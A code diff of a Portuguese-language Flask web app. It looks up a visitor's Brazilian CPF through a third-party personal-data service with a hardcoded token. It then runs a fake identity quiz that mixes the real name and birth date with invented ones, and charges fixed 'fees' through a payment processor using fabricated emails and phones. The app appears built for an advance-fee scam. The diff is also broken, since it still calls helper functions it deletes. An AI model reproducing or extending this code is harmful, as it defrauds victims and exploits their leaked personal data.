@@ -1,13 +1,10 @@
 import os
 import requests
 import logging
-from datetime import datetime, timedelta
-import time
-from typing import Dict, Any, Optional
 import random
-import string
+from datetime import datetime, timedelta
+from typing import Dict, Any
 from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
-
 
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
@@ -17,21 +14,126 @@ app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
 app.static_folder = 'static'
 
-# URLs das APIs
-CAC_API_URL = "https://portal-cac.org/api_clientes.php?cpf={cpf}"
-BACKUP_API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf_sem_pontuacao}"
+API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
-# Configurações de timeout
-TIMEOUT = 30  # segundos
+def gerar_nomes_falsos(nome_real: str) -> list:
+    nomes = [
+        "MARIA SILVA SANTOS",
+        "JOSE OLIVEIRA SOUZA",
+        "ANA PEREIRA LIMA",
+        "JOAO FERREIRA COSTA",
+        "ANTONIO RODRIGUES ALVES",
+        "FRANCISCO GOMES SILVA",
+        "CARLOS SANTOS OLIVEIRA",
+        "PAULO RIBEIRO MARTINS",
+        "PEDRO ALMEIDA COSTA",
+        "LUCAS CARVALHO LIMA"
+    ]
+    # Remove nomes que são muito similares ao nome real
+    nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
+    # Seleciona 2 nomes aleatórios
+    nomes_falsos = random.sample(nomes, 2)
+    # Adiciona o nome real e embaralha
+    todos_nomes = nomes_falsos + [nome_real]
+    random.shuffle(todos_nomes)
+    return todos_nomes
 
-def generate_random_email():
-    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    return f"{random_string}@temp.com"
+def gerar_datas_falsas(data_real: str) -> list:
+    data_real = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
+    datas_falsas = []
 
-def generate_random_phone():
-    ddd = random.randint(11, 99)
-    numero = ''.join(random.choices(string.digits, k=8))
-    return f"{ddd}9{numero}"
+    # Gera duas datas falsas próximas à data real
+    for _ in range(2):
+        dias = random.randint(-365*2, 365*2)  # ±2 anos
+        data_falsa = data_real + timedelta(days=dias)
+        datas_falsas.append(data_falsa)
+
+    # Adiciona a data real e embaralha
+    todas_datas = datas_falsas + [data_real]
+    random.shuffle(todas_datas)
+
+    # Formata as datas no padrão brasileiro
+    return [data.strftime('%d/%m/%Y') for data in todas_datas]
+
+@app.route('/consultar_cpf', methods=['POST'])
+def consultar_cpf():
+    cpf = request.form.get('cpf', '').strip()
+    cpf_numerico = ''.join(filter(str.isdigit, cpf))
+
+    if not cpf_numerico or len(cpf_numerico) != 11:
+        flash('CPF inválido. Por favor, digite um CPF válido.')
+        return redirect(url_for('index'))
+
+    try:
+        response = requests.get(
+            API_URL.format(cpf=cpf_numerico),
+            timeout=30
+        )
+        response.raise_for_status()
+        dados = response.json()
+
+        if dados and 'DADOS' in dados and 'NOME' in dados['DADOS']:
+            dados_usuario = {
+                'cpf': cpf_numerico,
+                'nome_real': dados['DADOS']['NOME'],
+                'data_nasc': dados['DADOS']['NASC'],
+                'nomes': gerar_nomes_falsos(dados['DADOS']['NOME'])
+            }
+            session['dados_usuario'] = dados_usuario
+            return render_template('verificar_nome.html',
+                                dados=dados_usuario,
+                                current_year=datetime.now().year)
+        else:
+            flash('CPF não encontrado ou dados incompletos.')
+            return redirect(url_for('index'))
+
+    except Exception as e:
+        logger.error(f"Erro na consulta: {str(e)}")
+        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('index'))
+
+@app.route('/verificar_nome', methods=['POST'])
+def verificar_nome():
+    nome_selecionado = request.form.get('nome')
+    dados_usuario = session.get('dados_usuario')
+
+    if not dados_usuario or not nome_selecionado:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('index'))
+
+    if nome_selecionado != dados_usuario['nome_real']:
+        flash('Nome selecionado incorreto. Por favor, tente novamente.')
+        return redirect(url_for('index'))
+
+    # Gera datas falsas para a próxima etapa
+    datas = gerar_datas_falsas(dados_usuario['data_nasc'])
+    dados_usuario['datas'] = datas
+    session['dados_usuario'] = dados_usuario
+
+    return render_template('verificar_data.html',
+                         dados=dados_usuario,
+                         current_year=datetime.now().year)
+
+@app.route('/verificar_data', methods=['POST'])
+def verificar_data():
+    data_selecionada = request.form.get('data')
+    dados_usuario = session.get('dados_usuario')
+
+    if not dados_usuario or not data_selecionada:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('index'))
+
+    data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
+    if data_selecionada != data_real:
+        flash('Data selecionada incorreta. Por favor, tente novamente.')
+        return redirect(url_for('index'))
+
+    # Se chegou aqui, a verificação foi bem sucedida
+    return render_template('dados_usuario.html',
+                         dados={'name': dados_usuario['nome_real'],
+                               'cpf': dados_usuario['cpf']},
+                         current_year=datetime.now().year)
+
 
 class For4PaymentsAPI:
     API_URL = "https://app.for4payments.com.br/api/v1"
@@ -149,76 +251,10 @@ def create_payment_api() -> For4PaymentsAPI:
 def index():
     return render_template('index.html', current_year=datetime.now().year)
 
-@app.route('/consultar_cpf', methods=['POST'])
-def consultar_cpf():
-    cpf = request.form.get('cpf', '').strip()
-    cpf_numerico = ''.join(filter(str.isdigit, cpf))
-
-    if not cpf_numerico or len(cpf_numerico) != 11:
-        flash('CPF inválido. Por favor, digite um CPF válido.')
-        return redirect(url_for('index'))
-
-    # Tenta a API principal primeiro - apenas uma vez
-    try:
-        logger.info(f"Tentando API principal para CPF: {cpf_numerico}")
-        response = requests.get(
-            CAC_API_URL.format(cpf=cpf_numerico),
-            timeout=TIMEOUT,
-            headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            }
-        )
-        response.raise_for_status()
-
-        dados = response.json()
-        if dados and all(key in dados for key in ['name', 'cpf', 'email', 'phone']):
-            logger.info("Dados encontrados na API principal")
-            session['user_data'] = dados
-            session['api_source'] = 'primary'
-            return render_template('dados_usuario.html', 
-                                dados=dados,
-                                current_year=datetime.now().year)
-
-    except Exception as e:
-        logger.error(f"Erro na API principal: {str(e)}")
-        # Continua para a API de backup em caso de qualquer erro
-
-    # Se a API principal falhou, tenta imediatamente a API de backup
-    try:
-        logger.info(f"Tentando API de backup para CPF: {cpf_numerico}")
-        response = requests.get(
-            BACKUP_API_URL.format(cpf_sem_pontuacao=cpf_numerico),
-            timeout=TIMEOUT
-        )
-        response.raise_for_status()
-
-        backup_dados = response.json()
-        logger.debug(f"Resposta da API de backup: {backup_dados}")
-
-        if backup_dados and 'DADOS' in backup_dados and 'NOME' in backup_dados['DADOS']:
-            logger.info("Dados encontrados na API de backup")
-            dados = {
-                'name': backup_dados['DADOS']['NOME'],
-                'cpf': cpf_numerico,
-                'email': generate_random_email(),
-                'phone': generate_random_phone()
-            }
-            session['user_data'] = dados
-            session['api_source'] = 'backup'
-            return render_template('dados_usuario.html', 
-                                dados=dados,
-                                current_year=datetime.now().year,
-                                is_backup_api=True)
-
-    except Exception as e:
-        logger.error(f"Erro na API de backup: {str(e)}")
-
-    flash('CPF não encontrado ou dados incompletos.')
-    return redirect(url_for('index'))
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('user_data')
+    user_data = session.get('dados_usuario') # Corrected session key
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -226,10 +262,10 @@ def pagamento():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['name'],
-            'email': user_data['email'],
+            'name': user_data['nome_real'], # Corrected key
+            'email': user_data.get('email', generate_random_email()), # Handle missing email
             'cpf': user_data['cpf'],
-            'phone': user_data['phone'],
+            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
             'amount': 247.10  # Soma das duas taxas: 128,40 + 118,70
         }
 
@@ -246,7 +282,7 @@ def pagamento():
 
 @app.route('/pagamento_categoria', methods=['POST'])
 def pagamento_categoria():
-    user_data = session.get('user_data')
+    user_data = session.get('dados_usuario') # Corrected session key
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -259,10 +295,10 @@ def pagamento_categoria():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['name'],
-            'email': user_data['email'],
+            'name': user_data['nome_real'], # Corrected key
+            'email': user_data.get('email', generate_random_email()), # Handle missing email
             'cpf': user_data['cpf'],
-            'phone': user_data['phone'],
+            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
             'amount': 114.10  # Valor fixo para taxa de categoria
         }
 
@@ -290,7 +326,7 @@ def check_payment(payment_id):
 
 @app.route('/obrigado')
 def obrigado():
-    user_data = session.get('user_data')
+    user_data = session.get('dados_usuario') #Corrected session key
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -300,7 +336,7 @@ def obrigado():
 
 @app.route('/categoria/<tipo>')
 def categoria(tipo):
-    user_data = session.get('user_data')
+    user_data = session.get('dados_usuario') # Corrected session key
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
